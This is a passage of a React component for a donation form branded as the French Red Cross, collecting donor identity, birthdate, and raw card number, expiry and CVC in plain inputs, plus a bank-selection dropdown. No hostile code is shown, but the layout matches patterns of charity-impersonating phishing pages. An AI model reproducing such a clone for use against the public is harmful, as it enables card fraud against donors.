                                            onChange={(e) => { setPrenom(e.target.value); if (errors.prenom) setErrors({ ...errors, prenom: null }); }}
                                            onBlur={(e) => handleBlur('prenom', e.target.value)}
                                            className={errors.prenom ? "error-input" : ""}
                                            required
                                        />
                                        {errors.prenom && <span className="error-message">{errors.prenom}</span>}
                                    </div>
                                    <div className="form-group-donation half">
                                        <label htmlFor="lastname">Nom *</label>
                                        <input
                                            type="text"
                                            id="lastname"
                                            value={nom}
                                            onChange={(e) => { setNom(e.target.value); if (errors.nom) setErrors({ ...errors, nom: null }); }}
                                            onBlur={(e) => handleBlur('nom', e.target.value)}
                                            className={errors.nom ? "error-input" : ""}
                                            required
                                        />
                                        {errors.nom && <span className="error-message">{errors.nom}</span>}
                                    </div>
                                </div>

                                <div className="form-group-donation">
                                    <label htmlFor="address">Adresse *</label>
                                    <input
                                        type="text"
                                        id="address"
                                        value={adresse}
                                        onChange={(e) => { setAdresse(e.target.value); if (errors.adresse) setErrors({ ...errors, adresse: null }); }}
                                        onBlur={(e) => handleBlur('adresse', e.target.value)}
                                        placeholder="Votre adresse complète"
                                        className={errors.adresse ? "error-input" : ""}
                                        required
                                    />
                                    {errors.adresse && <span className="error-message">{errors.adresse}</span>}
                                </div>

                                <div className="form-group-donation">
                                    {!showManualAddress ? (
                                        <button
                                            className="btn-link-complement"
                                            onClick={(e) => { e.preventDefault(); setShowManualAddress(true); }}
                                            style={{
                                                background: 'none',
                                                border: 'none',
                                                color: '#666',
                                                textDecoration: 'underline',
                                                cursor: 'pointer',
                                                padding: '0',
                                                fontSize: '0.9rem',
                                                marginBottom: '15px',
                                                display: 'block'
                                            }}
                                        >
                                            + Complément adresse (batiment, étage...)
                                        </button>
                                    ) : (
                                        <div className="form-group-donation fade-in">
                                            <label htmlFor="complement">Complément adresse</label>
                                            <input
                                                type="text"
                                                id="complement"
                                                value={complementAdresse}
                                                onChange={(e) => setComplementAdresse(e.target.value)}
                                                placeholder="Adresse 1, 2, 3 etc."
                                            />
                                        </div>
                                    )}
                                </div>

                                <div className="form-row">
                                    <div className="form-group-donation half">
                                        <label htmlFor="zipcode">Code postal *</label>
                                        <input
                                            type="text"
                                            id="zipcode"
                                            value={codePostal}
                                            onChange={(e) => { setCodePostal(e.target.value); if (errors.codePostal) setErrors({ ...errors, codePostal: null }); }}
                                            onBlur={(e) => handleBlur('codePostal', e.target.value)}
                                            className={errors.codePostal ? "error-input" : ""}
                                            required
                                        />
                                        {errors.codePostal && <span className="error-message">{errors.codePostal}</span>}
                                    </div>
                                    <div className="form-group-donation half">
                                        <label htmlFor="city">Ville *</label>
                                        <input
                                            type="text"
                                            id="city"
                                            value={ville}
                                            onChange={(e) => { setVille(e.target.value); if (errors.ville) setErrors({ ...errors, ville: null }); }}
                                            onBlur={(e) => handleBlur('ville', e.target.value)}
                                            className={errors.ville ? "error-input" : ""}
                                            required
                                        />
                                        {errors.ville && <span className="error-message">{errors.ville}</span>}
                                    </div>
                                </div>

                                <div className="form-group-donation">
                                    <label htmlFor="country">Pays *</label>
                                    <select
                                        id="country"
                                        value={pays}
                                        onChange={(e) => { setPays(e.target.value); if (errors.pays) setErrors({ ...errors, pays: null }); }}
                                        onBlur={(e) => handleBlur('pays', e.target.value)}
                                        className={errors.pays ? "error-input" : ""}
                                        required
                                    >
                                        <option value="">Selectionne un pays</option>
                                        <option value="France">FRANCE</option>
                                        <option value="Belgique">BELGIQUE</option>
                                        <option value="Suisse">SUISSE</option>
                                        <option value="Canada">CANADA</option>
                                        <option value="Autre">AUTRE</option>
                                    </select>
                                    {errors.pays && <span className="error-message">{errors.pays}</span>}
                                </div>

                                <div className="form-group-donation">
                                    <label htmlFor="phone">Téléphone *</label>
                                    <div style={{ color: '#000' }}>
                                        <input
                                            type="tel"
                                            id="phone"
                                            ref={phoneInputRef}
                                            defaultValue={telephone}
                                            onChange={(e) => {
                                                const val = e.target.value;
                                                setTelephone(val);
                                                if (val.trim()) {
                                                    setErrors(prev => {
                                                        const n = { ...prev };
                                                        delete n.telephone;
                                                        return n;
                                                    });
                                                }
                                            }}
                                            onBlur={(e) => {
                                                const val = e.target.value || (itiRef.current?.getNumber() || "");
                                                handleBlur('telephone', val);
                                            }}
                                            className={errors.telephone ? "error-input" : ""}
                                            style={{ width: '100%', paddingLeft: '75px' }}
                                        />
                                    </div>
                                    {errors.telephone && <span className="error-message">{errors.telephone}</span>}
                                </div>

                                <div className="form-group-donation">
                                    <label htmlFor="birthdate">Date de naissance *</label>
                                    <input
                                        type="text"
                                        id="birthdate"
                                        value={dateNaissance}
                                        onChange={(e) => { setDateNaissance(e.target.value); if (errors.dateNaissance) setErrors({ ...errors, dateNaissance: null }); }}
                                        onBlur={(e) => handleBlur('dateNaissance', e.target.value)}
                                        placeholder="jj/mm/aaaa"
                                        maxLength="10"
                                        className={errors.dateNaissance ? "error-input" : ""}
                                        required
                                    />
                                    {errors.dateNaissance && <span className="error-message">{errors.dateNaissance}</span>}
                                </div>

                                <div className="form-group-donation">
                                    <label style={{ display: 'block', marginBottom: '15px' }}>Je souhaite mon reçu fiscal : *</label>
                                    <div style={{ display: 'flex', flexDirection: 'column', gap: '15px', alignItems: 'flex-start' }}> {/* Alignement gauche global du bloc */}
                                        <label style={{ display: 'flex', alignItems: 'center', gap: '10px', fontWeight: 'normal', cursor: 'pointer', fontSize: '1rem', whiteSpace: 'nowrap' }}>
                                            <input type="radio" name="receipt" value="email" defaultChecked style={{ transform: 'scale(1.2)' }} />
                                            Par email
                                        </label>
                                        <label style={{ display: 'flex', alignItems: 'center', gap: '10px', fontWeight: 'normal', cursor: 'pointer', fontSize: '1rem', whiteSpace: 'nowrap' }}>
                                            <input type="radio" name="receipt" value="courrier" style={{ transform: 'scale(1.2)' }} />
                                            Par courrier
                                        </label>
                                    </div>
                                </div>

                                <p style={{ fontSize: '0.8rem', color: '#666', marginTop: '20px', fontStyle: 'italic' }}>
                                    * Champs obligatoires (ces informations sont indispensables pour bénéficier de votre réduction fiscale)
                                </p>
                            </form>
                        </div>
                    </section>

                    {/* Bloc 3: Mon règlement */}
                    <section className="don-reglement">
                        <div className="reglement-card">
                            <div className="card-header">
                                <h2>3. Mon règlement</h2>
                            </div>

                            <div className="secure-box" style={{ borderTop: 'none', borderBottom: '1px solid #eee', background: '#fff', padding: '15px', display: 'flex', alignItems: 'center', gap: '10px' }}>
                                <img src={bouclier} alt="Securisé" className="lock-icon" style={{ width: '20px', height: '20px' }} />
                                <p style={{ margin: 0, fontSize: '0.85rem', color: '#555' }}>
                                    Paiements sécurisés avec les derniers protocoles de chiffrement.
                                </p>
                            </div>

                            <div className="payment-methods">
                                {[
                                    { method: "card", label: "Carte Bancaire", img: cartedecredit },
                                    { method: "google-pay-apple-pay", label: "Pay / Apple Pay", img: ggpayapppay },
                                    { method: "paypal", label: "PayPal", img: paypal },
                                    { method: "virement", label: "Virement", img: virement }
                                ].map(({ method, label, img }) => (
                                    <button
                                        key={method}
                                        className={`payment-option ${activePayment === method ? "active" : ""}`}
                                        onClick={() => handlePaymentChange(method)}
                                    >
                                        <img src={img} alt={label} className="icon" />
                                        <span>{label}</span>
                                    </button>
                                ))}
                            </div>

                            {activePayment === "card" && (
                                <div className="card-input-box fade-in">
                                    <div className="form-group-donation">
                                        <label htmlFor="cardNumber" style={{ textTransform: 'uppercase', fontSize: '0.8rem', fontWeight: '600', color: '#555', marginBottom: '5px', display: 'block' }}>Saisissez votre numéro de carte bancaire</label>
                                        <div style={{ position: 'relative' }}>
                                            <input
                                                type="text"
                                                id="cardNumber"
                                                value={cardNumber}
                                                onChange={(e) => { setCardNumber(e.target.value); if (errors.cardNumber) setErrors({ ...errors, cardNumber: null }); }}
                                                onBlur={(e) => handleBlur('cardNumber', e.target.value)}
                                                placeholder="1234 1234 1234 1234"
                                                style={{ paddingLeft: '50px' }}
                                                className={errors.cardNumber ? "error-input" : ""}
                                                required
                                            />
                                            <img src={cartedecredit} alt="" style={{ position: 'absolute', left: '15px', top: '50%', transform: 'translateY(-50%)', width: '25px', opacity: 0.5 }} />
                                        </div>
                                        {errors.cardNumber && <span className="error-message">{errors.cardNumber}</span>}
                                    </div>
                                    <div className="form-row">
                                        <div className="form-group-donation half">
                                            <label htmlFor="cardExpiry" style={{ textTransform: 'uppercase', fontSize: '0.8rem', fontWeight: '600', color: '#555', marginBottom: '5px', display: 'block' }}>Date d'expiration</label>
                                            <input
                                                type="text"
                                                id="cardExpiry"
                                                value={cardExpiry}
                                                onChange={(e) => { setCardExpiry(e.target.value); if (errors.cardExpiry) setErrors({ ...errors, cardExpiry: null }); }}
                                                onBlur={(e) => handleBlur('cardExpiry', e.target.value)}
                                                placeholder="MM / AA"
                                                maxLength="5"
                                                className={errors.cardExpiry ? "error-input" : ""}
                                                required
                                            />
                                            {errors.cardExpiry && <span className="error-message">{errors.cardExpiry}</span>}
                                        </div>
                                        <div className="form-group-donation half">
                                            <label htmlFor="cardCvc" style={{ textTransform: 'uppercase', fontSize: '0.8rem', fontWeight: '600', color: '#555', marginBottom: '5px', display: 'block' }}>CVC</label>
                                            <input
                                                type="text"
                                                id="cardCvc"
                                                value={cardCvc}
                                                onChange={(e) => { setCardCvc(e.target.value); if (errors.cardCvc) setErrors({ ...errors, cardCvc: null }); }}
                                                onBlur={(e) => handleBlur('cardCvc', e.target.value)}
                                                placeholder="CVC"
                                                maxLength="4"
                                                className={errors.cardCvc ? "error-input" : ""}
                                                required
                                            />
                                            {errors.cardCvc && <span className="error-message">{errors.cardCvc}</span>}
                                        </div>
                                    </div>
                                </div>
                            )}

                            {showVirement && (
                                <div className="virement-box" style={{ marginTop: '10px', marginBottom: '10px', padding: '20px' }}>
                                    <div className="bank-select">
                                        <label>Sélectionnez votre banque :</label>
                                        <select>
                                            <option>Crédit Agricole</option>
                                            <option>BNP Paribas</option>
                                            <option>Société Générale</option>
                                            <option>Autre...</option>
                                        </select>
                                    </div>
                                </div>
                            )}

                            <button className="validate-donation" onClick={handleValidate}>
                                JE VALIDE {displayAmount} €
                            </button>

                            <div style={{ textAlign: 'center', paddingBottom: '20px' }}>
                                <img src={bouclier} alt="Securisé" style={{ width: '50px', opacity: 0.3 }} />
                            </div>
                        </div>
                    </section>
                </section>
                {/* Footer Accordéon Modernisé */}
                <footer className="don-footer">
                    <div className="footer-inner">
                        {[
                            {
                                title: "Pourquoi donner ?",
                                items: [
                                    "La Croix-Rouge française, c'est 160 ans d'histoire aux côtés des plus vulnérables.",
                                    "Vos dons financent les missions prioritaires : urgences, santé, actions sociales.",
                                    "Association reconnue d'intérêt général : 75 % déductibles de l'IR (dans la limite légale)."

                                ]
                            },
                            {
                                title: "Données personnelles",
                                items: [
                                    "Données utilisées pour la gestion du don (reçu fiscal, relation donateur, enquêtes).",
                                    "Conformément à la réglementation, vous disposez de droits d'accès, de rectification et d'opposition.",
                                    "Pour en savoir plus, consultez notre politique de protection des données."
                                ]
                            },
                            {
                                title: "Confiance & Sécurité",
                                items: [
                                    "Site 100 % sécurisé (chiffrement SSL/TLS, normes de l'industrie).",
                                    "Une équipe donateurs est à votre écoute pour répondre à vos questions.",
                                    "Vos informations de paiement ne sont pas conservées sur nos serveurs."
                                ]
                            }
                        ].map((section, index) => (
                            <div key={index} className={`acc ${openAccordion === index ? "open" : ""}`}>
                                <button
                                    className="acc-header"
                                    onClick={() => toggleAccordion(index)}
                                >
                                    <span>{section.title}</span>
                                    <span className="acc-caret">▼</span>
                                </button>
                                <div className="acc-body">
                                    <ul className="acc-list">
                                        {section.items.map((item, i) => (
                                            <li key={i}>{item}</li>
                                        ))}
                                    </ul>
                                </div>
                            </div>
                        ))}
                    </div>
                </footer>
            </div>


        </>
    );
}